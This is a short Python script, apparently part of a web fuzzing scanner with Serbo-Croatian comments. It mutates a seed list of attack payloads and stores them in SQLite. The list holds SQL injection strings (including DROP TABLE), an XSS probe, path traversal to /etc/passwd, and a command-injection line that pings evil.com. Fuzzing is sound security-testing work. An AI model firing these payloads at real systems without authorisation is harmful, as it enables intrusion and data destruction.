import sqlite3
import random
import string

DB_PATH = "scan_results.db"

# Baza mutacija koje koristi engine za pravljenje novih payload-a
base_mutations = [
    "' OR '1'='1",
    "<script>alert(1)</script>",
    "'; DROP TABLE users;--",
    "admin' --",
    "' or sleep(5)--",
    "../../../../etc/passwd",
    "|| ping -c 1 evil.com ||"
]

def generate_mutations(payload, count=5):
    mutations = []
    for _ in range(count):
        part = ''.join(random.choices(string.ascii_letters + string.digits, k=4))
        mutated = payload.replace("'", f"'{part}")
        mutations.append(mutated)
    return mutations

def evolve_from_history():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()

    try:
        cursor.execute("SELECT payload FROM fuzz_results WHERE status_code >= 500 ORDER BY RANDOM() LIMIT 5")
        seeds = [row[0] for row in cursor.fetchall()]
    except:
        seeds = []

    conn.close()

    if not seeds:
        seeds = base_mutations

    final_payloads = []
    for seed in seeds:
        final_payloads += generate_mutations(seed, 4)

    return list(set(final_payloads))

def save_to_db(payloads):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("CREATE TABLE IF NOT EXISTS payload_pool (id INTEGER PRIMARY KEY AUTOINCREMENT, payload TEXT)")
    for p in payloads:
        cursor.execute("INSERT INTO payload_pool (payload) VALUES (?)", (p,))
    conn.commit()
    conn.close()

if __name__ == "__main__":
    print("[⚙️ MUTATION ENGINE START]")
    new_payloads = evolve_from_history()
    save_to_db(new_payloads)
    print(f"[+] Sačuvano novih mutiranih payload-a: {len(new_payloads)}")
